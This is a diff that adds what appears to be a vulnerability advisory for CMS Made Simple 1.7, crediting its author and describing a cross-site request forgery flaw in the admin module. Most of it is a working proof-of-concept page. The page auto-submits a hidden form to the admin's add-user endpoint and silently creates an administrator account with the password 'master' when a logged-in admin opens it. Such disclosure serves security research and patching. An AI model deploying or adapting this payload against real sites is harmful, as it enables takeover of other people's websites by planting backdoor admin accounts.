@@ -1,0 +1,89 @@
+                                =======================================================================
+   
+                                                CMS Made Simple 1.7 CSRF Vulnerability
+ 
+                                =======================================================================
+   
+                                                              
+ 
+   
+   
+  # Vulnerability found in- Admin module
+   
+  # email         Pratulag@yahoo.com
+   
+  # company       aksitservices
+   
+  # Credit by     Pratul Agrawal
+ 
+  # Software      CMS Made Simple 1.7
+
+  # Category  	  CMS / Portals
+  
+  # Site p4ge     http://server/demo/2/10/CMS_Made_Simple
+  
+  # Plateform     php
+
+  # Greetz to     Gaurav, Prateek, Vivek, Sanjay, Sourabh, Varun, sameer (My Web Team)
+  
+   
+   
+  #  Proof of concept   #
+ 
+  Targeted URL:  http://sever/demo/2/10/CMS_Made_Simple
+  
+ 
+   Script to Add admin user through Cross Site request forgery
+   
+             .  ................................................................................................................
+   
+                         <html>
+
+                          <body>
+
+                             <form name="csrf" action="http://server/cmsmadesimple/admin/adduser.php" method="post">
+
+                                    <input type=hidden name="sp_" value="64becc90">
+
+                                    <input type=hidden name="user" value="master">
+
+                                    <input type=hidden name="password" value="master">
+
+                                    <input type=hidden name="passwordagain" value="master">
+
+                                    <input type=hidden name="firstname" value="12345">
+
+                                    <input type=hidden name="lastname" value="12345">
+
+                                    <input type=hidden name="email" value="aa@aa.com">
+
+                                    <input type=hidden name="active" value="on">
+
+                                    <input type=hidden name="groups" value="1">
+
+                                    <input type=hidden name="g1" value="1">
+
+                                    <input type=hidden name="adduser" value="true">
+
+              
+                             </form>
+
+                               <script>
+
+                                 document.csrf.submit();
+
+                               </script>
+
+                          </body>
+
+                        </html>
+   
+             .  ..................................................................................................................
+   
+   
+   
+  After execution just refresh the page and we can see that the admin user added automatically.
+  
+  
+  #If you have any questions, comments, or concerns, feel free to contact me.
+                    
